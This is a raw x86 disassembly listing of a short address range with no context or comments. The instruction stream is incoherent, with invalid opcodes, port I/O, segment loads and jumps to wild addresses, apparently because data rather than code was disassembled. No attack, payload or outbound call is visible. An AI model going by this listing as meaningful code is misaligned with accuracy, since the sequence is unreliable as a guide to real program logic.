  4153fd:	mov    ch,0x1
  4153ff:	or     BYTE PTR [esi],bl
  415401:	sub    bl,cl
  415403:	test   eax,0x3c7305d1
  415408:	push   ds
  415409:	mov    edx,DWORD PTR [eax]
  41540b:	shl    DWORD PTR [edx-0x4d],cl
  41540e:	and    al,0xb0
  415410:	mov    ecx,0xdc4378d9
  415415:	inc    eax
  415416:	daa    
  415417:	inc    ebp
  415418:	sbb    eax,0x5a5daec9
  41541d:	or     al,0x59
  41541f:	fisubr DWORD PTR [edi+0x1]
  415422:	test   BYTE PTR [esi+edx*1-0x59043cc6],cl
  415429:	mov    eax,0x4ff11384
  41542e:	xchg   edx,eax
  41542f:	pop    ds
  415430:	outs   dx,BYTE PTR ds:[esi]
  415431:	ss jl  0x415464
  415434:	into   
  415435:	enter  0xf3ac,0x3c
  415439:	xchg   ecx,eax
  41543a:	lds    esi,FWORD PTR [edx+0x64]
  41543d:	loopne 0x4154a4
  41543f:	mov    esi,DWORD PTR [ecx]
  415441:	ror    DWORD PTR [eax+0x3d9f807a],0x2a
  415448:	imul   ebp,DWORD PTR [ecx],0xd3e78446
  41544e:	test   al,0xa8
  415450:	ja     0x41545e
  415452:	pusha  
  415453:	adc    eax,0x3ac7922f
  415458:	aad    0xc4
  41545a:	mov    al,ds:0x6c42fbb5
  41545f:	mov    ds:0xd0af2ac2,al
  415464:	dec    eax
  415465:	push   0xbfe493
  41546a:	mov    eax,0x8faeb414
  41546f:	lds    esi,FWORD PTR [esi]
  415471:	ds dec edi
  415473:	retf   
  415474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415475:	les    edi,FWORD PTR [ebx]
  415477:	fnstsw WORD PTR [ecx]
  415479:	fdiv   QWORD PTR [esi+0x12]
  41547c:	repz sti 
  41547e:	cwde   
  41547f:	or     al,0x37
  415481:	int3   
  415482:	das    
  415483:	xchg   edi,eax
  415484:	cmp    dh,bh
  415486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415487:	in     eax,dx
  415488:	jge    0x41543d
  41548a:	scas   al,BYTE PTR es:[edi]
  41548b:	je     0x415466
  41548d:	adc    ah,BYTE PTR [eax-0x7]
  415490:	out    dx,al
  415491:	mov    ah,0x7b
  415493:	mov    DWORD PTR [edi*2+0x4ff294d8],0x3e2d5d59
  41549e:	xchg   ecx,eax
  41549f:	mov    ebx,0xef3d8292
  4154a4:	stc    
  4154a5:	push   edi
  4154a6:	aaa    
  4154a7:	pop    esi
  4154a8:	repnz push edi
  4154aa:	mov    cs:0x196767ae,al
  4154b0:	pop    ebp
  4154b1:	jg     0x415469
  4154b3:	rol    BYTE PTR [ecx-0x1a],0x3f
  4154b7:	call   0x2b04f115
  4154bc:	cmp    eax,0x4b14df2c
  4154c1:	leave  
  4154c2:	int3   
  4154c3:	lock xchg esp,eax
  4154c5:	cs push esp
  4154c7:	in     eax,dx
  4154c8:	das    
  4154c9:	fcmovnbe st,st(1)
  4154cb:	test   eax,0x7ca23ae
  4154d0:	fistp  WORD PTR [eax]
  4154d2:	sub    esi,ebp
  4154d4:	cdq    
  4154d5:	jnp    0x415523
  4154d7:	in     al,0x55
  4154d9:	scas   al,BYTE PTR es:[edi]
  4154da:	push   eax
  4154db:	aaa    
  4154dc:	outs   dx,DWORD PTR ds:[esi]
  4154dd:	test   DWORD PTR [eax],esi
  4154df:	xor    DWORD PTR [edi+0x51],edi
  4154e2:	data16 icebp 
  4154e4:	mov    ch,0xd3
  4154e6:	lea    esp,[edi-0x6c]
  4154e9:	fist   DWORD PTR [esi]
  4154eb:	fs xchg ebp,eax
  4154ed:	int3   
  4154ee:	outs   dx,BYTE PTR ds:[esi]
  4154ef:	jecxz  0x4154fd
  4154f1:	stc    
  4154f2:	stos   BYTE PTR es:[edi],al
  4154f3:	test   eax,0x3da1a57a
  4154f9:	adc    DWORD PTR [ebp+0x13],eax
  4154fc:	test   al,0x1
  4154fe:	push   esi
  4154ff:	xchg   esp,eax
  415500:	cmp    esp,eax
  415502:	and    eax,0xc59d48bb
  415507:	jo     0x415501
  415509:	mov    ds:0xfb86145,eax
  41550e:	fsubr  st,st(1)
  415510:	cmp    DWORD PTR [ebp+0x64772b7c],esp
  415516:	in     eax,0xd8
  415518:	push   ss
  415519:	ins    BYTE PTR es:[edi],dx
  41551a:	dec    esp
  41551b:	sub    ecx,DWORD PTR [esi]
  41551d:	and    dh,BYTE PTR [ebx-0x483259ee]
  415523:	xor    al,0xd8
  415525:	jnp    0x415513
  415527:	aam    0xcc
  415529:	(bad)  
  41552a:	adc    ah,BYTE PTR [esi+0x27ff6e7c]
  415530:	stos   DWORD PTR es:[edi],eax
  415531:	or     BYTE PTR [edi],cl
  415533:	push   ebx
  415534:	mov    esp,0xd6417227
  415539:	xor    DWORD PTR [esi],ebp
  41553b:	mov    ch,BYTE PTR [eax-0x53]
  41553e:	sbb    BYTE PTR [edi],ah
  415540:	imul   edx,DWORD PTR ds:0x47d9005,0x3d5806b1
  41554a:	xchg   ebp,eax
  41554b:	ret    0x1647
  41554e:	shl    DWORD PTR [edi],cl
  415550:	icebp  
  415551:	or     eax,0x748935de
  415556:	pop    ss
  415557:	lock push cs
  415559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41555a:	lahf   
  41555b:	retf   
  41555c:	xlat   BYTE PTR ds:[ebx]
  41555d:	je     0x415526
  41555f:	scas   al,BYTE PTR es:[edi]
  415560:	mov    esi,0x68882a0c
  415565:	mov    bh,0xe2
  415567:	xor    al,0x9f
  415569:	jmp    0x8ef1:0x10bf5598
  415570:	sbb    BYTE PTR [ebp+0x314b9e1a],0x40
  415577:	push   ds
  415578:	(bad)  
  415579:	or     al,0x50
  41557b:	inc    esi
  41557c:	push   0x77d03bbd
  415581:	cdq    
  415582:	cs or  eax,esp
  415585:	cmp    esi,esp
  415587:	adc    ch,BYTE PTR [esi-0x746f5243]
  41558d:	mov    cl,0xa2
  41558f:	push   ebp
  415590:	add    esp,DWORD PTR ds:0x8c67
  415595:	pop    ss
  415596:	(bad)  
  415597:	retf   
  415598:	gs leave 
  41559a:	ficom  DWORD PTR [ebx]
  41559c:	inc    esi
  41559d:	push   edx
  41559e:	inc    esi
  41559f:	inc    ebx
  4155a0:	stos   DWORD PTR es:[edi],eax
  4155a1:	jbe    0x41557c
  4155a3:	jb     0x4155c6
  4155a5:	and    dl,al
  4155a7:	addr16 (bad) 
  4155a9:	fadd   QWORD PTR [ecx]
  4155ab:	pop    esi
  4155ac:	dec    ebx
  4155ad:	jnp    0x415551
  4155af:	repz sbb cl,BYTE PTR [edi]
  4155b2:	test   al,0x5f
  4155b4:	xor    bl,bh
  4155b6:	inc    ecx
  4155b7:	out    dx,al
  4155b8:	jmp    0xcac8a6f9
  4155bd:	cdq    
  4155be:	ds jecxz 0x41559d
  4155c1:	and    eax,0x9d2b22f2
  4155c6:	imul   DWORD PTR [eax+0x72]
  4155c9:	jb     0x41558e
  4155cb:	push   ds
  4155cc:	add    esi,DWORD PTR [esi+eax*4-0x1d]
  4155d0:	into   
  4155d1:	mov    ds:0x99a1d979,eax
  4155d6:	mov    dh,0x49
  4155d8:	sub    al,0xc
  4155da:	dec    esi
  4155db:	call   0xf35d889e
  4155e0:	ror    DWORD PTR [ebx],1
  4155e2:	jnp    0x41563a
  4155e4:	cmc    
  4155e5:	or     al,0xc6
  4155e7:	fs dec edx
  4155e9:	inc    edx
  4155ea:	stos   BYTE PTR es:[edi],al
  4155eb:	jge    0x41561b
  4155ed:	jg     0x4155c8
  4155ef:	(bad)  
  4155f0:	push   ss
  4155f1:	jl     0x4155b5
  4155f3:	xchg   edx,eax
  4155f4:	lods   eax,DWORD PTR ds:[esi]
  4155f5:	hlt    
  4155f6:	pushf  
  4155f7:	xor    cl,BYTE PTR [edi]
  4155f9:	pop    eax
  4155fa:	inc    ecx
  4155fb:	jmp    0x1f618316
  415600:	mov    edi,0xfdc2bdda
  415605:	jecxz  0x41559b
  415607:	or     ebx,DWORD PTR [ebx-0x7ae73aa3]
  41560d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41560f:	xchg   esp,eax
  415610:	lods   eax,DWORD PTR ds:[esi]
  415611:	xchg   BYTE PTR [esi],ah
  415613:	daa    
  415614:	or     WORD PTR ds:0xccc2cfe7,di
  41561b:	js     0x41569b
  41561d:	fwait
  41561e:	push   es
  41561f:	out    dx,eax
  415620:	fmul   DWORD PTR [eax-0x46]
  415623:	xchg   esi,eax
  415624:	js     0x415605
  415626:	xor    eax,0x16d0d280
  41562b:	cwde   
  41562c:	rcl    DWORD PTR [eax-0x63],1
  41562f:	inc    ebp
  415630:	mov    ecx,0x60d90616
  415635:	mov    eax,0xf2d4a257
  41563a:	sbb    esi,DWORD PTR [esp+edi*8+0x1a]
  41563e:	mov    cl,0x3
  415640:	repz sar BYTE PTR [esi+0x2cdd1198],0xa2
  415648:	xchg   esp,eax
  415649:	mov    bh,0x76
  41564b:	sub    eax,0x51b94de3
  415650:	leave  
  415651:	(bad)  
  415652:	jge    0x415654
  415654:	mov    al,ds:0xe16262e2
  415659:	fistp  DWORD PTR [ecx-0x26]
  41565c:	ret    0x8167
  41565f:	mov    bl,0xcb
  415661:	scas   eax,DWORD PTR es:[edi]
  415662:	ins    DWORD PTR es:[edi],dx
  415663:	xchg   DWORD PTR [ecx+0x1e],ecx
  415666:	aas    
  415667:	test   BYTE PTR [ebp-0x3f],cl
  41566a:	inc    ebx
  41566b:	ds scas al,BYTE PTR es:[edi]
  41566d:	(bad)  
  41566e:	pop    edx
  41566f:	sar    al,cl
  415671:	jb     0x415610
  415673:	aaa    
  415674:	sti    
  415675:	int3   
  415676:	jno    0x4156e1
  415678:	enter  0xd295,0x8f
  41567c:	or     eax,0xbcb85f6e
  415681:	push   ebx
  415682:	xchg   BYTE PTR [edi],al
  415684:	inc    edx
  415685:	cmovbe eax,esi
  415688:	into   
  415689:	data16 arpl WORD PTR [ebx-0x32e3dc75],bx
  415690:	dec    edx
  415691:	ds (bad) 
  415693:	loope  0x4156b9
  415695:	push   ebp
  415696:	je     0x41564b
  415698:	std    
  415699:	(bad)  
  41569b:	arpl   si,bx
  41569d:	cli    
  41569e:	test   BYTE PTR [eax],0x38
  4156a1:	fstp   TBYTE PTR [edi]
  4156a3:	push   esp
  4156a4:	or     DWORD PTR [ebx+0x4e],ecx
  4156a7:	imul   esp,DWORD PTR [edx+0x59],0x9d442e61
  4156ae:	div    DWORD PTR [eax]
  4156b0:	(bad)  
  4156b1:	int    0xdd
  4156b3:	inc    edi
  4156b4:	loop   0x4156d6
  4156b6:	retf   0xb82f
  4156b9:	xchg   esp,eax
  4156ba:	pop    ds
  4156bb:	pop    ss
  4156bc:	fbld   TBYTE PTR [ebx-0x6872bf99]
  4156c2:	sub    BYTE PTR [ebp+0x379b1f7e],dl
  4156c8:	or     eax,0x492d136b
  4156cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156ce:	and    ebp,eax
  4156d0:	mov    edi,0x4600a4fb
  4156d5:	dec    ebx
  4156d6:	jecxz  0x41570a
  4156d8:	fnstcw WORD PTR [edi]
  4156da:	add    al,al
  4156dc:	push   ss
  4156dd:	clc    
  4156de:	and    DWORD PTR ds:0x55b99ebf,edx
  4156e4:	or     ch,0x10
  4156e7:	and    DWORD PTR [ecx-0x22],eax
  4156ea:	jnp    0x415768
  4156ec:	aaa    
  4156ed:	xlat   BYTE PTR ds:[ebx]
  4156ee:	pop    edx
  4156ef:	pop    ds
  4156f0:	bsr    ebp,DWORD PTR [esi+0x16]
  4156f4:	mov    ds:0x8c352a3c,al
  4156f9:	test   BYTE PTR [eax-0x32],ah
  4156fc:	or     esi,edi
  4156fe:	iret   
  4156ff:	les    edi,FWORD PTR [esi-0x5d]
  415702:	xchg   edi,eax
  415703:	test   DWORD PTR [edx+0x7cf7924],edi
  415709:	call   0x8efe7b36
  41570e:	out    dx,al
  41570f:	loope  0x415702
  415711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415712:	int3   
  415713:	mov    esp,0x8e7f375e
  415718:	inc    ebx
  415719:	pop    ss
  41571a:	or     BYTE PTR [edx-0x57],ch
  41571d:	loopne 0x4156f9
  41571f:	add    edx,0x4f239ea
  415725:	ficomp DWORD PTR [esp+edx*8-0x2d]
  415729:	fdivrp st(3),st
  41572b:	js     0x4156e2
  41572d:	lahf   
  41572e:	fwait
  41572f:	xor    al,0xc5
  415731:	adc    bh,BYTE PTR [edx+eax*1+0x10739b4a]
  415738:	int    0xe7
  41573a:	jb     0x4157a0
  41573c:	mov    eax,0x9c9f49a3
  415741:	pop    ds
  415742:	prefetch BYTE PTR [ecx+0x55caa374]
  415749:	cmp    dh,BYTE PTR [esi+0x30]
  41574c:	jae    0x41579c
  41574e:	fsubp  st(5),st
  415750:	loopne 0x41575f
  415752:	sub    al,0x27
  415754:	mov    ds:0xb5b76cc9,al
  415759:	mov    bh,0xa6
  41575b:	dec    edi
  41575c:	xor    eax,0x9aad5568
  415761:	test   eax,0x7a1dd9e1
  415766:	je     0x4157bf
  415768:	pop    ds
  415769:	or     eax,0xad342c0
  41576e:	les    ecx,FWORD PTR [edi]
  415770:	ret    
  415771:	ss in  eax,0x49
  415774:	cmp    edx,esp
  415776:	pop    ss
  415777:	sbb    ah,BYTE PTR [eax-0x43]
  41577a:	dec    ebx
  41577b:	lea    ebx,es:[edi-0x4a732ce0]
  415782:	icebp  
  415783:	and    esi,eax
  415785:	pop    ds
  415786:	xchg   esp,eax
  415787:	not    DWORD PTR [si]
  41578a:	jle    0x4157c0
  41578c:	ins    DWORD PTR es:[edi],dx
  41578d:	pop    ecx
  41578e:	lahf   
  41578f:	mov    ecx,0x388c6cfb
  415794:	cli    
  415795:	ja     0x4157b8
  415797:	sar    DWORD PTR [ecx-0x75200d31],cl
  41579d:	int3   
  41579e:	addr16 popf 
  4157a0:	dec    ebx
  4157a1:	cmp    edx,DWORD PTR [eax+0x41]
  4157a4:	jo     0x4157b3
  4157a6:	inc    ebx
  4157a7:	or     DWORD PTR [eax+0x4d],0xfbd7e674
  4157ae:	jp     0x4157af
  4157b0:	add    eax,0x2f3f10fc
  4157b5:	cmp    BYTE PTR [eax+0x74],bl
  4157b8:	pop    ebp
  4157b9:	rcr    BYTE PTR [esi-0x72432c53],1
  4157bf:	popa   
  4157c0:	cmp    eax,0xc4e24be2
  4157c5:	jb     0x4157ba
  4157c7:	push   ds
  4157c8:	xchg   edi,eax
  4157c9:	sti    
  4157ca:	(bad)  
  4157cb:	sub    bh,bl
  4157cd:	dec    esp
  4157ce:	jge    0x4157f3
  4157d0:	call   0x3cbea87b
  4157d5:	test   BYTE PTR [ebx],0x5
  4157d8:	pop    edx
  4157d9:	stos   DWORD PTR es:[edi],eax
  4157da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157db:	push   es
  4157dc:	inc    ebx
  4157dd:	mov    cl,0x85
  4157df:	sbb    BYTE PTR [eax-0xef29e06],0xd0
  4157e6:	dec    eax
  4157e7:	push   cs
  4157e8:	sub    DWORD PTR ds:[edi+0x5b],eax
  4157ec:	inc    ebp
  4157ed:	lods   al,BYTE PTR ds:[esi]
  4157ee:	jo     0x415809
  4157f0:	jle    0x415863
  4157f2:	mov    bh,0x2d
  4157f4:	and    ecx,esp
  4157f6:	and    esp,DWORD PTR [edx+0xc]
  4157f9:	mov    ebp,ecx
  4157fb:	dec    ecx
  4157fc:	sub    dh,dl
  4157fe:	in     al,0x5a
  415800:	clc    
  415801:	inc    edi
  415802:	icebp  
  415803:	mov    ebx,0x2d226ecf
  415808:	rcr    BYTE PTR [esi+0x79],0x36
  41580c:	xor    al,BYTE PTR [ebx-0x73cc7ce1]
  415812:	xchg   DWORD PTR [edi],esi
  415814:	cmp    esi,DWORD PTR [edi-0x2a]
  415817:	fsub   DWORD PTR [edi+0x3f034b09]
  41581d:	pushf  
  41581e:	jbe    0x415836
  415820:	dec    edi
  415821:	inc    eax
  415822:	scas   al,BYTE PTR es:[edi]
  415823:	in     eax,dx
  415824:	aas    
  415825:	push   0xfffffff5
  415827:	test   DWORD PTR [ecx-0x35442226],eax
  41582d:	mov    eax,ds:0xef8d6dbb
  415832:	adc    BYTE PTR [ecx+ebx*1+0x33],ah
  415836:	adc    edi,edx
  415838:	push   ss
  415839:	dec    esi
  41583a:	and    BYTE PTR [esi-0x12053e66],ah
  415840:	xor    edx,0xffffff98
  415843:	push   ecx
  415844:	fdiv   QWORD PTR ds:0x2d97d5ef
  41584a:	pop    ss
  41584b:	arpl   WORD PTR [ecx+0x1d621454],bx
  415851:	or     eax,0x26522811
  415856:	fbstp  TBYTE PTR [edi]
  415858:	cli    
  415859:	fs jns 0x4158ba
  41585c:	push   eax
  41585d:	sub    al,0x44
  41585f:	mov    bl,ch
  415861:	mov    esp,DWORD PTR [edx]
  415863:	fsub   DWORD PTR [ebp+0x42158b84]
  415869:	rol    BYTE PTR [eax],cl
	...
